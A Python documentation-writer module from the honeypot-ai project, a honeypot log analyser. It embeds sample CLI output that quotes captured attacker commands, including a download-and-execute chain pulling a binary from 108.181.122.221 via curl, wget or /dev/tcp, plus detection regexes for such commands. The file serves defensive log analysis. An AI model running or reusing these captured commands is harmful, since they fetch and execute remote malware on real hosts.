from .markdownwriterbase import *
from urllib.parse import quote

class DocsMarkdownWriter(MarkdownWriterBase):
    """Writes markdown for the honeypot-ai project documentation and README"""
    
    GITHUB_BASE_URL = "https://github.com/LucasFaudman/honeypot-ai/blob/main/"

    def prepare(self):
        self.md_editors.append(self.add_description)
        self.md_editors.append(self.add_example_reports)
        self.md_editors.append(self.add_setup)
        self.md_editors.append(self.add_basic_usage)
        self.md_editors.append(self.add_advanced_usage)
        self.md_editors.append(self.add_default_config)
        self.custom_scripts_title = "Module Descriptions"
        self.md_editors.append(self.add_custom_scripts)

    
    def script_link(self, script):
        return link(script.split("/")[-1], f"{self.GITHUB_BASE_URL}{quote(script)}")


    def add_custom_scripts(self, md, *arg):
        scripts = {
            "main.py": {
                "description":"Main script for initializing and running all analyzer objects according to command line arguments and config file",
            },
            "attackanalyzer.py": {
                "description":"High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor",
            },
            "analyzerbase":{
                "description" : "Base classes, utility functions, libraries, and constants for all analyzer modules",
                "common.py" : "Imports and constants used by all analyzer modules",
                "baseobjects.py": "Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_",
                "attack.py" : "Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers",
                "malware.py": "Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object",                
                "session.py": "Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object",
                "sourceip.py": "SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object",
                "util.py": "Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text",
            },
            "loganalyzers":{
                "description" : "Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories",
                "logparser.py": "Classes for reading all logs into Python objects with standardized keys",
                "logprocessor.py": "Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met.",
                "attackdirorganizer.py": "Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading",
                "attackdirreader.py": "Reads and counts log events in Attack directories organized by attackdirorganizer",
            },
            "openaianalyzers":{
                "description" : "Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs",
                "aibase.py": "Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost",
                "completions.py": "OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code",
                "assistant.py": "OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects",
                "tools.py": "Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects",
            },
            "osintanalyzers":{
                "description" : "Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object",
                "osintbase.py": "Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer",
                "ipanalyzer.py": "IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois",
                "malwareanalyzer.py": "MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB",
                "soupscraper.py": "SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects",
                
            },
            "markdownwriters":{
                "description" : "Scripts for writing markdown files from Attack objects",
                "markdownwriterbase.py": "Base class for all markdown writers and markdown shortcut functions",
                "attackmarkdownwriter.py": "Markdown writer for Attack objects following ISC format",
                "ipmarkdownwriter.py": "Markdown writer for ipdata added to Attack objects by IPAnalyzer",
                "runstepsmarkdownwriter.py": "Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode",
                "docsmarkdownwriter.py": "Markdown writer for the honeypot-ai project documentation and README",
                "visualizer.py": "Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding)",
            },
            "setup.sh": {
                "description":"Setup script for installing the honeypot-ai project",
            },
            "setup":{
                "description" : "Scripts for setting up the honeypot-ai project",
                "requirements.txt": "List of all required packages for the honeypot-ai project",
                "getchromedrier.py": "Utility script to download correct chromedriver for Selenium",
                "sync-logs.sh": "Utility script to sync logs from honeypot to honeypot-ai project logs directory",
                "install-zeek-on-honeypot.sh": "Utility script to install Zeek on a remote honeypot",
            },
        }

        script_md = ""

        for module, module_dict in scripts.items():
            module_md = h4(self.script_link(module))
            module_md += blockquote(module_dict.pop("description"))
            
            if module_dict:
                module_md += table(
                    ["Script", "Description"], 
                    [[self.script_link(module + "/" + script), description] for script, description in module_dict.items()]
                    )
            
            script_md += module_md
        
        
        md += collapseable_section(script_md, self.custom_scripts_title, 2)
        
        return md
    

    def add_setup(self, md, data_object):
        setup = ""
        setup += h4("Step 1: Clone the Repository")
        setup += codeblock("git clone https://github.com/LucasFaudman/honeypot-ai", lang="bash")
        
        setup += h4(f"Step 2: Run the Setup Script {self.script_link('setup.sh')}")
        setup += codeblock("chmod +x honeypot-ai/setup.sh && honeypot-ai/setup.sh", lang="bash")
        setup += blockquote("This will install all required packages in a virtual environment and walk you through setting up your config.json file. ")
        setup += "\n" + blockquote(
            f"You will need your honeypot IP and login credentials to create {self.script_link('setup/sync-logs.sh')} and {self.script_link('setup/install-zeek-on-honeypot.sh')}.")
        
        setup += h4(f"Optional: Install Zeek on your Honeypot using {self.script_link('setup/install-zeek-on-honeypot.sh')}")
        setup += codeblock("honeypot-ai/install-zeek-on-honeypot.sh", lang="bash")
        
        setup += h4(f"Step 3: Sync Logs from Honeypot to local logs directory using {self.script_link('setup/sync-logs.sh')}")
        setup += codeblock("honeypot-ai/sync-logs.sh", lang="bash")
        
        setup += h4("Step 4: Run Honeypot-AI with --help to see all command line arguments and options.")
        setup += codeblock("honeypot-ai/run.sh --help", lang="bash")
        setup += "\nOR\n" 
        setup += codeblock("python3 honeypot-ai/main.py --help", lang="bash")
        
        md += collapseable_section(setup, "Setup", 2)
        return md


    def add_description(self, md, data_object):
        description = ""
        description += h1("honeypot-ai")
        description += h4(
            "A modular honeypot log analyzer and OSINT collector with OpenAI integration to easily create ISC style reports and interactively chat with AI about attacks. "
            "Currently supports Cowrie, DShield and Zeek logs. "
            )
        
        description +=  blockquote("Built by Lucas Faudman for SANS ISC/DShield")
        md += description
        return md
    

    def make_usage_example(self, description, command, output):
        usage_md = blockquote(description)
        usage_md += codeblock(command, lang="bash")
        usage_md += collapseable_section(codeblock(output.strip()), "Output", 0, end_line=False)
        return usage_md


    def add_basic_usage(self, md, data_object):
        basic_usage = ""
        for key, example in BASIC_USAGE.items():
            basic_usage += self.make_usage_example(**example, output=OUTPUTS[key])
        
        md += collapseable_section(basic_usage, "Basic Usage", 2)
        return md


    def add_advanced_usage(self, md, data_object):
        advanced_usage = ""
        advanced_usage += h3("All Command Line Arguments")
        help_text = data_object.get("config_parser").format_help()
        advanced_usage += codeblock(help_text, lang="bash")
        advanced_usage += blockquote(f"For more advanced usage see comments in the source code and/or edit DEFAULT_CONFIG in {self.script_link('main.py')}.")
        md += collapseable_section(advanced_usage, "Advanced Usage", 2)
        return md
    

    def add_default_config(self, md, data_object):
        md += collapseable_section(codeblock(data_object.get("default_config"), lang='python'), "Default Config", 2)
        return md


    def add_example_reports(self, md, data_object):
        example_reports_md = h2("Attack Examples")
        titles = [f"example-reports/{dir.name}" for dir in sorted(Path("./reports").glob("*"), key=lambda x: x.stat().st_mtime, reverse=True) if dir.is_dir()]
        reports_table = table(
            ["Attack", "AI Run Steps"],
            [[self.script_link(title), self.script_link(title+"/run-steps.md")] for title in titles]
        )
        example_reports_md += reports_table
        md += example_reports_md
        return md



BASIC_USAGE = {
    "load_from_logs_list": {
        "description": "Load attacks from logs then list all attacks",
        "command": "honeypot-ai/run.sh --load-from-logs --list-attacks",
        },


    "load_from_logs_sort": {
        "description": "Load attacks from logs then list first 5 attacks sorted in descending order by number of commands, then start time. Then print the commands for each attack",
        "command": "honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands",
        },


    "organize_attacks": {
        "description": "Organize attacks with at most 10 source IPs into attack directories for faster loading and to prepare for storing analysis results",
        "command": "honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10",
        },


    "load_from_attacks_dir": {
        "description": "Load attacks from the attacks directory that have at least 10 commands or at least 3 HTTP requests, then print the first command, 3 most common HTTP requests, and the most common src ip for each attack",
        "command": "honeypot-ai/run.sh --load-from-attacks-dir --min-commands 10 --min-http-requests 3 --print-attrs first_command most_common3_http_requests most_common_src_ip",
        },


    "only_attacks": {
        "description": "Load only attacks with IDs XXXX and YYYY from the attacks directory then print the source IPs, unique dst ports, sessions, commands, and malware for each attack",
        "command": "honeypot-ai/run.sh -lfa --only-attacks XXXX YYYY --print-attrs source_ips uniq_dst_ports sessions commands malware",
        },


    "analyze_write_export": {
        "description": "Analyze attack with ID XXXX using OpenAI and OSINT analyzers then write markdown and export to reports directory",
        "command": "honeypot-ai/run.sh -lfa --only-attack XXXX --analyze --write --export",
        },


    "chat_mode": {
        "description": "Enter chat mode to ask custom questions about attack with ID XXXX before analyzing, writing markdown, and exporting",
        "command": "honeypot-ai/run.sh -lfa --only-attack XXXX -AWE --chat",
        },


    "interactive": {
        "description": "Enter interactive Python shell to manually modify attacks before analyzing, writing markdown, and exporting",
        "command": "honeypot-ai/run.sh -lfa -AWE --interact",
    },


    "config_update": {
        "description": "Update config file with values from command line arguments",
        "command": "honeypot-ai/run.sh --config config.json --update-config --openai-api-key YOUR_API_KEY",
    },
        
}

OUTPUTS = {
    "load_from_logs_list": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --load-from-logs --list-attacks
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10ba43ed0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10ba43e10>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(50->49) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 7056: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6 <- bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747 by malware_urls
Merged 0 attacks by out of 7056 attempts (0.0000%) 
Merge Attacks Time: 0.7498s
(49->49) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\\?cd\\+/tmp')
Regex merged a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
Regex merged 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 into 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 on commands: re.compile('cat /proc/mounts; /bin/busybox [\\w\\d]+')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(49->42) - Merged 7 attacks with shared sig regexes

Exceptions:
Total: 0

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 42

Attacks:
1: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
2: Attack (chash: 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8), SourceIPs: 14, Sessions: 602, SSH: 602, Commands: 4, Cmdlogs: 1, Malware: 1 
3: Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1306, HTTP: 1306, Httplogs: 147 
4: Attack (chash: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804), SourceIPs: 7, Sessions: 634, SSH: 634, Commands: 2, Cmdlogs: 1, 
5: Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 6, Sessions: 767, SSH: 767, Commands: 1, Cmdlogs: 1, 
6: Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 18, HTTP: 18, Httplogs: 1 
7: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
8: Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1561, HTTP: 1561, Httplogs: 520 
9: Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 63, HTTP: 63, Httplogs: 6 
10: Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 48, HTTP: 48, Httplogs: 16 
11: Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 21, HTTP: 21, Httplogs: 2 
12: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
13: Attack (hhash: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98), SourceIPs: 3, Sessions: 3, HTTP: 3, Httplogs: 1 
14: Attack (chash: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80), SourceIPs: 2, Sessions: 1658, SSH: 1656, HTTP: 2, Commands: 1, Cmdlogs: 1, Httplogs: 1 
15: Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 20, HTTP: 20, Httplogs: 9 
16: Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 2, Sessions: 6, HTTP: 6, Httplogs: 2 
17: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
18: Attack (hhash: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e), SourceIPs: 2, Sessions: 2, HTTP: 2, Httplogs: 1 
19: Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
20: Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
21: Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 32, HTTP: 32, Httplogs: 15 
22: Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 30, HTTP: 30, Httplogs: 26 
23: Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 27, HTTP: 27, Httplogs: 27 
24: Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 24, HTTP: 24, Httplogs: 24 
25: Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 23, HTTP: 23, Httplogs: 22 
26: Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 12, HTTP: 12, Httplogs: 11 
27: Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 10, HTTP: 10, Httplogs: 10 
28: Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 1 
29: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
30: Attack (hhash: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
31: Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
32: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
33: Attack (chash: bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 1, Cmdlogs: 1, 
34: Attack (hhash: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
35: Attack (hhash: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
36: Attack (hhash: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
37: Attack (hhash: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
38: Attack (hhash: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
39: Attack (hhash: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
40: Attack (hhash: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
41: Attack (hhash: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
42: Attack (hhash: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
Total: 42
Honeypot AI Finished Successfully!    
    """,
    


    "load_from_logs_sort": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1167bacd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11683edd0>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(50->49) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 7056: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6 <- bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747 by malware_urls
Merged 0 attacks by out of 7056 attempts (0.0000%) 
Merge Attacks Time: 0.7596s
(49->49) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\\?cd\\+/tmp')
Regex merged a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
Regex merged 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 into 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 on commands: re.compile('cat /proc/mounts; /bin/busybox [\\w\\d]+')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(49->42) - Merged 7 attacks with shared sig regexes
Skipping 37 attacks (max_attacks=5)

Exceptions:
Total: 0

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 5

Attacks:
1: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
2: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
3: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
4: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
5: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
Total: 5


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
